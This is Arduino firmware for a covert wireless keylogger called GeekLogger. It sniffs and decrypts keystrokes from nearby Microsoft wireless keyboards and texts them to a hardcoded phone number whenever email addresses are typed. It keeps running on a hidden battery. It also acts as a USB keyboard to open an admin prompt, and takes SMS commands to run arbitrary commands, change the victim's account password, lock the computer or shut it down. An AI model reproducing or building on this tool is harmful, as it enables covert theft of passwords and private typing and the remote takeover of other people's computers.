/*

 GeekLogger, 
 Nov 24, 2017

 Jahanzaib is going to be future security architect and is a developer 
 and enthusiastic towards programming. He has an interest in reverse 
 engineering and exploit development. 
 
 KeyLogger is a stealthy Arduino-based device,that wirelessly
 and passively sniffs,decrypts, logs and reports back all keystrokes 
 from any Microsoft wireless keyboards in the area. It can communicate with us
 via sms and controls system.  
 
 KeyLogger has the capability to send SMS alerts upon certain 
 keystrokes being typed, e.g. "www.bank.com". If KeyLogger is removed 
 from AC power, it appears to shutoff, however it continues to operate 
 covertly using an internal battery which is automatically recharged 
 upon reconnecting to AC power.

 KeyLogger builds upon the awesome work and research from:
 - Travis Goodspeed of GoodFET (see goodfet.nrf)
 - Thorsten SchrÃƒÆ’Ã‚Â¶der and Max Moser of KeyKeriki v2
 - Samy Kamkar is an American privacy and security researcher, computer hacker, 
   whistleblower and entrepreneur.
 
 KeyLogger uses the HID files from the KeyKeriki project to convert the HID values to keys.
 Keyboad scan time is greatly reduced.

  Libraries:
 a) - Adafruit FONA Library:
  It acts as a high-level interface between Arduino to track GSM module, 
  provides us handling functions like enabling internet, send and receive calls and SMS, 
  sending get and post request and GPRS. We disabled some of the functions except sending and 
  receiving SMS and saved 5% memory and slimmed our library so that we can automate few more functions.

  
 b) - ElapsedMillis Library:
  It's a timer library which tells how much time has passed.

 c) - RF24 Library:
  It's acts as a high-level interface between Arduino and NRF chip. We’ve modified this library and 
  added disabledynamicpayload function.
 
 d) - MemoryFree Library
    In order to determine the amount of memory currently available the most accurate result can be 
    found by using the MemoryFree library.

 */

/*

  Channels I've seen non-encrypted keyboards on
  4,5,9,21,25,31,34,44,52,54,58,72,74,76
  so we will prioritize them in code.

 
 unknown packets on unencrypted (could there be channel information here?):
 chan 52 -> 
 08: f0f0 f0f0 3daf 6dc9   593d af6d c959 3df0 
 08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 


example of encrypted packets from AES keyboard (HID keycode 4 ('a'))
MAC = 0xA8EE9A90CDLL
     8: 08 38 16 01 01 00 F3 2A 
     8: 56 56 56 56 56 56 56 56 
    20: 09 98 16 01 F8 94 EB F5 45 66 1F DF DE FF E1 12 FC CF 44 91 
    20: 0D 98 16 01 8A 22 20 1A 79 29 28 EE 21 E1 78 71 28 B2 C6 B4 
    20: 09 98 16 01 1B 10 31 F3 F7 2A E1 F6 77 C5 F2 5E 00 6C B5 A3 
     8: 08 38 16 01 C8 B2 00 A2 
    20: 09 98 16 01 DF 34 82 79 F4 15 94 68 D6 B0 10 07 25 2F 37 53 
    20: 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 
    20: 09 98 16 01 FF 04 2F 16 50 50 BD 9F 8F 96 C8 C4 43 B3 3A 94 
     8: 08 38 16 01 CA B2 00 A0 
    20: 09 98 16 01 05 79 33 5C 5D 41 FD BA D4 98 FB 5D 48 CA DD 63 
    20: 09 98 16 01 5B 8A F9 DF 90 87 15 D2 AA 80 48 6A B2 54 D0 F7 



/* pins:
 nRF24L01+ radio:
 1: (square): GND
 2: (next row of 4): 3.3 VCC 
 3: CE 9
 4: CSN: 10
 5: SCK: SCK
 6: MOSI MOSI
 7: MISO: MISO
 8: IRQ: not used for our purposes


microsoft keyboard packet structure:
 struct mskb_packet
 {
 uint8_t device_type;
 uint8_t packet_type;
 uint8_t model_id;
 uint8_t unknown;
 uint16_t sequence_id;
 uint8_t flag1;
 uint8_t flag2;
 uint8_t d1;
 uint8_t key;
 uint8_t d3;
 uint8_t d4; 
 uint8_t d5;
 uint8_t d6;
 uint8_t d7;
 uint8_t checksum; 
 };
 

 
 */

 
#include <elapsedMillis.h>

#define SHOW_RAM

#ifdef SHOW_RAM
  #include <MemoryFree.h>
  elapsedMillis time_elapsed_ram;
#endif

#define TIME_RECHECK 60 //300 // 300=5min,60=1min // change as you like //30sec debug mode //300sec for production mode 
unsigned int TIME_RECHECK_MILLIS = (unsigned int) TIME_RECHECK*1000 ;

#define TIME_RECHECK_SMS 30 //300 // 300=5min,60=1min // change as you like //30sec debug mode //300sec for production mode 
unsigned int TIME_RECHECK_SMS_MILLIS = (unsigned int) TIME_RECHECK_SMS*1000 ;

boolean locked_on_kb = false;
elapsedMillis time_elapsed;
elapsedMillis time_elapsed_sms;

//#define PRINT_REGISTERS

//#define FULL_SYS_RST // only basic testing done

// should we run with a GSM FONA board attached?
#define ENABLE_GSM


// number to send sms to upon trigger words (only if ENABLE_GSM is defined)
char SMSnumber[14] = "+923321234567";
#include <Keyboard.h>

// support as many triggers as you like up to 13 bytes each
#define TRIGGERS 3
#define TRIGGER_LENGTH 13 //12
char triggers[TRIGGERS][TRIGGER_LENGTH] = {0};

void setTriggers()
{
  strncpy(triggers[0], "@gmail.com", TRIGGER_LENGTH-1);
  strncpy(triggers[1], "@yahoo.com", TRIGGER_LENGTH-1);
  strncpy(triggers[2], "@hotmail.com", TRIGGER_LENGTH-1);
}


#define CE 9
#define CSN 10 // normally 10 but SPI flash uses 10 //8

#define FONA_RST 4  //4
#define LED_PIN 5  // tie to USB led if you want to show keystrokes


// number of keys to store *just* for our SMS  
#define STACKLEN 95
char stack[STACKLEN];
int stackptr = 0;

// ms to turn led OFF when we see a keystroke
#define LED_TIME 40 // ms
uint32_t strokeTime = 0;

// Serial baudrate
#define BAUDRATE 38400

#ifdef ENABLE_GSM

#define FONA_BAUDRATE 38400

#include "Adafruit_FONA.h"

// this is a large buffer for replies
#define REP_BUF_SIZE 65
char replybuffer[REP_BUF_SIZE];

HardwareSerial *fonaSerial = &Serial1;
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

#endif // ENABLE_GSM

#include <SPI.h>
#include "nRF24L01.h"
#include "RF24.h"
#include "mhid.h"


#include <EEPROM.h>
// location in atmega eeprom to store last flash write address
#define E_FLASH_ADDY 0x00 // 4 bytes
#define E_SETUP      0x04 // 1 byte [could be bit]
#define E_LAST_CHAN  0x05 // 1 byte
//#define E_CHANS      0x06 // 1 byte
//#define E_FIRST_RUN  0x07 // 1 byte 


#define csn(val) digitalWrite(CSN, val)
#define ce(val) digitalWrite(CE, val)
#define PKT_SIZE 16
#define MS_PER_SCAN 250

long time;
uint8_t channel = 0; // [usually between 3 and 80]
uint16_t lastSeq = 0;

// all MS keyboard macs appear to begin with 0xCD [we store in LSB]
uint64_t DEF_KB_PIPE = 0xAALL;
uint64_t kbPipe = 0xAALL; // will change, but we use 0xAA to sniff

// should we scan for kb or just go based off a known channel/pipe?
// if you turn this off, make sure to set kbPipe to a valid keyboard mac
#define SCAN_FOR_KB 1

// we should calculate this checksum offset by
// calc'ing checksum and xor'ing with actual checksums
uint8_t cksum_idle_offset = 0xFF;
uint8_t cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);

RF24 radio(CE, CSN);


// decrypt those keyboard packets!
void decrypt(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
    // our encryption key is the 5-byte MAC address (pipe)
    // and starts 4 bytes in (header is unencrypted)
    p[i] ^= kbPipe >> (((i - 4) % 5) * 8) & 0xFF;
}


void push(uint8_t val)
{
  stack[stackptr++] = val;
  if (stackptr > STACKLEN-1)
  {
    clearStack();
  }
}


char gotKeystroke(uint8_t* p)
{
  char letter;
  uint8_t key = p[11] ? p[11] : p[10] ? p[10] : p[9];
  letter = hid_decode(key, p[7]);

  Serial.print(" ");
  #ifdef PRINT_REGISTERS
    Serial.println(letter);
  #else
    Serial.print(letter);
  #endif

  // store in our temp array
  push(letter);

  // do we have a trigger word?
  for (uint8_t i = 0; i < TRIGGERS; i++)
    // we do!
    if (strstr(stack, triggers[i]) != NULL)
    {     
      sendSms();
    }

  

  reset_timer();
  return letter;
}

// send our sms when a trigger was found
//void sendSms(uint8_t j)
void sendSms()
{
  Serial.println("\nALERT");

  change_user_acc_password();
  delay(1000);
  lock_computer();
#ifdef ENABLE_GSM
  Serial.print("SMS: ");
  Serial.println(stack);

  if (!fona.sendSMS(SMSnumber, stack))
    Serial.println("SF");
  else
    Serial.println("SS");
#endif

  // clear our array so we don't trigger again
  clearStack(); 
}

void clearStack()
//clears the stack and resets the stackptr back to 0!
{
  memset(&stack, 0, sizeof(stack));
 
  stackptr = 0;
}

void clearReplyBuff()
{
  #ifdef  ENABLE_GSM
  memset(&replybuffer, 0, sizeof(replybuffer));
  #endif
}



uint8_t flush_rx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_RX );
  csn(HIGH);

  return status;
}


void ledBlinkEventLow()
{
  for(int i=1; i<=6;i++){
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    delay(50);
  }
  digitalWrite(LED_PIN, HIGH);
}

void ledBlinkEventHigh()
{
  for(int i=1; i<=12;i++){
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    delay(50);
  }
  digitalWrite(LED_PIN, HIGH);
}

void ledInvert()
{
  digitalWrite(LED_PIN, !digitalRead(LED_PIN));
}

void ledOn()
{
  digitalWrite(LED_PIN, HIGH);
}

void ledOff()
{
  digitalWrite(LED_PIN, LOW);
}

void checkAndHandleSerial()
{
  Serial.begin(BAUDRATE);
  if(!Serial) Serial.end();
}

void sniff()
{
  uint8_t p[PKT_SIZE], op[PKT_SIZE], lp[PKT_SIZE];
  char ch = '\0';
  uint8_t pipe_num;
  

  // if our led is off (flash our led upon keystrokes for fun)
  if (strokeTime && millis() - strokeTime >= LED_TIME)
  {
    strokeTime = 0;
    ledOn();
  }

  // if there is data ready
  if ( radio.available(&pipe_num) )
  {
    uint8_t sz = radio.getDynamicPayloadSize();
    radio.read(&p, PKT_SIZE);
    flush_rx();

    // these are packets WE send, ignore por favor
    if (p[0] == 0x52) // 0x52 == 'R'
      return;
    
    // is this same packet as last time?
    if (p[1] == 0x78)
    {
      boolean same = true;
      for (int j = 0; j < sz; j++)
      {
        if (p[j] != lp[j])
          same = false;
        lp[j] = p[j];
      }
      if (same)
        return;
    }

    

    // decrypt!
    decrypt(p);

    // i think this is retransmit?
//    if (p[10] != 0x00)
//      return;      
  #ifdef PRINT_REGISTERS
    Serial.print("\n    ");
    if (sz < 10)
      Serial.print(" ");
    Serial.print(sz);
    Serial.print(": ");
    if (sz > PKT_SIZE) sz = PKT_SIZE;

    for (int i = 0; i < sz/2; i++)
    {
      if (p[i*2] < 16)
        Serial.print("0");
      Serial.print(p[i*2], HEX);
      Serial.print(" ");
      if (p[i*2+1] < 16)
        Serial.print("0");
      Serial.print(p[i*2+1], HEX);
      Serial.print("  ");
    }
    Serial.println("");
  #endif
    
    // keyboard activity!
    if (p[0] == 0x0a)
    {
      // turn led off to signify keystroke
      ledOff();
      strokeTime = millis();
    }

    // keypress?
    // we will see multiple of the same packets, so verify sequence is different
    if (p[0] == 0x0a && p[1] == 0x78 && p[9] != 0 && lastSeq != (p[5] << 8) + p[4])
    {
      lastSeq = (p[5] << 8) + p[4];
      ch = gotKeystroke(p);
      for (int j = 0; j < PKT_SIZE; j++) op[j] = p[j];
    }
    
  }


}


void RESET_SYSTEM()
{
 #ifdef FULL_SYS_RST
  Serial.println("\n\nRST SYS!");
  Serial.flush();
  asm volatile ("   jmp 0");
 #endif
}


void reset_timer()
{
  time_elapsed = 0;
}

uint8_t write_reg(uint8_t reg, uint8_t value)                                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  csn(HIGH);
  return status;
}

// specifically for sniffing after the scan
// and transmitting to a secondary device
void setupRadio()
{
  //Serial.println("RF Initializing");
  radio.stopListening();

 
  radio.openReadingPipe(1, kbPipe);

  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MAX); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  radio.setChannel(channel);
  write_reg(0x03, 0x03);

  radio.startListening();
  radio.printDetails();
  //Serial.println("RF OK");
  
}




#define NELEMS(x)  (sizeof(x) / sizeof((x)[0]))

/*
boolean in_array(uint8_t *arr, uint8_t _channel)  // assuming array is int.
{
  for (uint8_t i = 0 ; i < NELEMS(arr) ; i++)
    if(arr[i] == _channel) return true;
  return  false;
}
*/

uint8_t channels[14] = { 4,5,9,21,25,31,34,44,52,54,58,72,74,76 }; // priority channels. scan these 1st


// scans for microsoft keyboards
// we reduce the complexity for scanning by a few methods:
// a) looking at the FCC documentation, these keyboards only communicate between 2403-2480MHz, rather than 2400-2526
// b) we know MS keyboards communicate at 2mbps, so we don't need to scan at 1mbps anymore
// c) we've confirmed that all keyboards have a mac of 0xCD, so we can check for that
// d) since we know the MAC begins with C (1100), the preamble should be 0xAA [10101010], so we don't need to scan for 0x55
// e) we know the data portion will begin with 0x0A38/0x0A78 so if we get that & 0xCD MAC, we have a keyboard.
// f) we reduced the scan time to 15sec by prioritizing channels and in most cases keyboard is found instantly.


uint8_t total_scan_count = 0;

void scan()
{

  Serial.println("Scanning KB");

  uint8_t p[PKT_SIZE];
  uint16_t wait = MS_PER_SCAN;

  // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78
  // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
  channel = EEPROM.read(E_LAST_CHAN);
  uint8_t last_chan = channel;

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MAX); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);

  // RF24 doesn't ever fully set this -- only certain bits of it
  write_reg(0x02, 0x00);

  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  write_reg(0x03, 0x00);

  radio.openReadingPipe(0, kbPipe);
  radio.disableCRC();
  radio.startListening();
  radio.printDetails(); 

  uint8_t channel_iterator = 0;
  
  uint8_t channel_scan_count = 0;
  boolean priority_scan = true;

  // from goodfet.nrf - thanks Travis Goodspeed! - thanks samy - modified by OffS3c
  while (1)
  {

    intervaled_sms_command_check();
    intervaled_show_ram();

    if(total_scan_count >= 2)
    {
      total_scan_count = 0;
      RESET_SYSTEM();
    }
    if(priority_scan && channel != last_chan) 
    {
      if(NELEMS(channels) > 0) channel = channels[channel_iterator++];
      if(channel_iterator > NELEMS(channels)) 
      {
        channel_iterator = 0;
        channel = 3;
        priority_scan = false;
      }
    }
    if ((channel > 80 || channel < 3)) 
    {
      channel = 3;
    }

    if(channel_scan_count >= 80+NELEMS(channels)+1)
    {
      priority_scan = true;
      channel_scan_count = 0;
      total_scan_count++;
    }

  
  
    Serial.print("CH: ");
    Serial.println(2400 + channel);    
    radio.setChannel(channel++);

    time = millis();
    while (millis() - time < wait)
    {      
      if (radio.available())
      {
        radio.read(&p, PKT_SIZE);

        if (p[4] == 0xCD)
        {
          Serial.print("! KB: ");
          for (int j = 0; j < 8; j++)
          {
            Serial.print(p[j], HEX);
            Serial.print(" ");
          }
          Serial.println("");
          total_scan_count = 0;
          ledBlinkEventLow();
          // packet control field (PCF) is 9 bits long, so our packet begins 9 bits in
          // after the 5 byte mac. so remove the MSB (part of PCF) and shift everything 1 bit
          if ((p[6] & 0x7F) << 1 == 0x0A && (p[7] << 1 == 0x38 || p[7] << 1 == 0x78))
          { 
            channel--; // we incremented this AFTER we set it
            Serial.print("KB FOUND on CH ");
            Serial.println(channel);
            EEPROM.write(E_LAST_CHAN, channel);

            total_scan_count = 0;
            locked_on_kb = true;
            ledBlinkEventHigh();
            reset_timer();
            
            kbPipe = 0;
            for (int i = 0; i < 4; i++)
            {
              kbPipe += p[i];
              kbPipe <<= 8;
            }
            kbPipe += p[4];

            // fix our checksum offset now that we have the MAC
            cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
            return;
          }
          
        }
      }
    }

    // reset our wait time after the first iteration
    // because we want to wait longer on our first channel
  
    ledInvert();
    channel_scan_count++;
  }

  priority_scan = true;
}





void setupGsm()
{
#ifdef ENABLE_GSM
  

  Serial.println("W4 GSM");
  
  // See if the FONA is responding
  fonaSerial->begin(FONA_BAUDRATE);
  ledOn();
  while (! fona.begin(*fonaSerial)) {  // make it slow so its easy to read!
    Serial.println("No GSM");
    ledInvert();
  }
  
  //Serial.println("GSM On");
  

  while (fona.getNetworkStatus() != 1) {
    Serial.println("W4 Network");
    ledInvert();
    delay(1000);
  }
  Serial.println("Network OK");
  
  ledBlinkEventLow();
  while (fona.getNumSMS() < 0) {
    delay(1000);
    Serial.println("W4 EEPROM");
    ledInvert();
  }
  Serial.println("GSM OK");
  ledBlinkEventHigh();
  
  //fona.deleteAllSMS();
  //delay(1000);
  


#endif
}



void setupRF(){
  radio.begin();
  Serial.println("RF OK");
}

void setupLed(){
  pinMode(LED_PIN, OUTPUT);
}

void setupSerial(){
  Serial.begin(BAUDRATE);
  delay(2000); // wait for serial
  if(!Serial) Serial.end();
  Serial.println("Boot(max 25 sec)");
}


void setupKbHid()
{
  Serial.end();
  delay(20);
  Keyboard.begin();
  delay(500);
}

void endKbHid()
{
  Keyboard.releaseAll();
  delay(500);
  Keyboard.end();
  delay(20);
  Serial.begin(BAUDRATE);
}

void open_admin_cmd()
{
  delay(50);
  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.press('x');
  delay(40);
  Keyboard.releaseAll();
  
  delay(80);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW);
  delay(30);
  Keyboard.write(KEY_UP_ARROW); 
  delay(30);

  Keyboard.write(KEY_RETURN);
  
  delay(2000);
  
  Keyboard.write(KEY_LEFT_ARROW);
  delay(50);
  Keyboard.write(KEY_RETURN);

  delay(3000);

  KeyboardWriteStr("cmd;exit");
  delay(20);
  Keyboard.write(KEY_RETURN);
  delay(1500);
  
}

void KeyboardWriteStr(String stringData) { // Used to serially push out a String with Serial.write()

  for (int i = 0; i < stringData.length(); i++)
  {
    Keyboard.write(stringData[i]);   // Push each char 1 by 1 on each loop pass
    delay(10);
  }

}

void run_admin_command(String command)
{
  setupKbHid();
  
  open_admin_cmd();

  delay(2000);

  //String full_cmd = "cmd /Q /D /T:7F /F:OFF /V:ON /C \" " + command + " \" && exit";
  String full_cmd = "cmd /C \"" + command + "\" && exit";
  
  KeyboardWriteStr(full_cmd);
  
  Keyboard.write(KEY_RETURN);
  
  delay(50);
  Keyboard.press(KEY_LEFT_GUI);
  delay(20);
  Keyboard.press(KEY_DOWN_ARROW);
  delay(10);
  
  Keyboard.releaseAll();
  delay(50);
  
  endKbHid();
  
}


void unlock_computer_with_my_password()
{
  setupKbHid();

  for(short x = 1; x <= 12; x++)
    Keyboard.write(KEY_BACKSPACE);
  delay(2000);
  
  KeyboardWriteStr("0mPas5WrD");
  
  delay(50);
  Keyboard.write(KEY_RETURN);
  
  endKbHid();
  
}



void shutdown_computer()
{
  run_admin_command("shutdown -s -t 5 -c GL");
}

void lock_computer()
{
  setupKbHid();

  Keyboard.press(KEY_LEFT_GUI);
  delay(20);
  Keyboard.press('l');
  delay(10);
  
  Keyboard.releaseAll();
  delay(50);
  
  endKbHid();
}

void change_user_acc_password()
{
  run_admin_command("NET USER %USERNAME% 0mPas5WrD");
}

void intervaled_sms_command_check()
{
  if(time_elapsed_sms > TIME_RECHECK_SMS_MILLIS)
  {
    sms_command_check();
    time_elapsed_sms = 0;
  }
}

#ifdef SHOW_RAM
void show_ram()
{
  Serial.print("\nRAM:");
  Serial.print(2560-freeMemory());
  Serial.println("/2560 b");
}
#endif

void intervaled_show_ram()
{
  #ifdef SHOW_RAM
   if (time_elapsed_ram > 20000) 
   {
     show_ram(); 
     time_elapsed_ram = 0;
   }
  #endif
}

void sms_command_check()
{
  #ifdef ENABLE_GSM
  char ActionStr[4] = "[A]";
  char CommandStr[4] = "[C]";
  
  if(fona.getNumSMS() > 0)
  {
    clearReplyBuff();
    uint16_t smslen;
    fona.readSMS(1, replybuffer, REP_BUF_SIZE-5, &smslen);
      
    
    char optiOn[4] = {0};
    strncpy(optiOn, replybuffer, 3);
    memmove( &replybuffer[0] , &replybuffer[4], strlen(replybuffer) );
    
    if (strstr(optiOn, ActionStr) != NULL)
    {
          ledBlinkEventHigh();
          if (strstr(replybuffer, "lockout") != NULL)
          {
            change_user_acc_password();
            lock_computer();
          } else if (strstr(replybuffer, "passwdoff") != NULL)
          {
            change_user_acc_password();
            shutdown_computer();
          } else if (strstr(replybuffer, "off") != NULL)
          {
            shutdown_computer();
          } else if (strstr(replybuffer, "unlock") != NULL)
          {
            unlock_computer_with_my_password();
          } else if (strstr(replybuffer, "passwd") != NULL)
          {
            change_user_acc_password();
          } else if (strstr(replybuffer, "lock") != NULL)
          {
            lock_computer();
          }
          
    } else if (strstr(optiOn, CommandStr) != NULL)
    {
      ledBlinkEventHigh();
      run_admin_command(replybuffer);
    }
    
    fona.sendSMS(SMSnumber, "OK");
    fona.deleteAllSMS();
    clearReplyBuff();
  }
  #endif
  
}

void rescan_()
{
  radio.stopListening();
  radio.disableDynamicPayloads();
  write_reg(0x2, 0x3);
  write_reg(0x3, 0x0);
  kbPipe = DEF_KB_PIPE;
  radio.openReadingPipe(1, kbPipe);

  // get channel and pipe
  scan();

  // make sure to resetup radio after the scan
  setupRadio();

  reset_timer();

}






void setup()
{

  delay(500);
  setupSerial();
  
  setupLed();
  ledOn();
  clearStack();
  clearReplyBuff();
  
#ifdef ENABLE_GSM
  setupGsm();
#endif
  
  setupRF();
  

  // get channel and pipe
#ifdef SCAN_FOR_KB
  scan();
#endif
  
  // make sure to resetup radio after the scan
  setupRadio();
  //clearStack();
  //clearReplyBuff();
  setTriggers();
  
  if(Serial) Serial.flush();
}


void loop()
{
  
  intervaled_sms_command_check();
  checkAndHandleSerial();
  sniff();
  
  if (locked_on_kb && time_elapsed > TIME_RECHECK_MILLIS) 
  {       
    Serial.println("\nRescan");
    rescan_();  
  }

  intervaled_show_ram();

  if(Serial) Serial.flush();
}




